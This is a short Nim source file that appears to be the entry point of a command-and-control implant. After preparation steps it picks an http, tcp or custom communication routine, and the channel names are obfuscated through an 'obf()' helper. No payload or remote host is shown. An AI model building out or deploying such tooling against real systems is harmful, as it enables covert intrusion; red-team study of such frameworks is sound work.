import ../utils/global
import ../utils/actions/prep
import http as httpRoutine
import tcp as tcpRoutine
import custom as customRoutine

proc main_init*(): void =
  # Here is where preparations run and the channel routine starts
  main_preparations()
  if channel == obf("http") or channel == obf("https"):
    httpRoutine.main()
  elif channel == obf("tcp"):
    tcpRoutine.main()
  elif channel == obf("custom"):
    customRoutine.main()
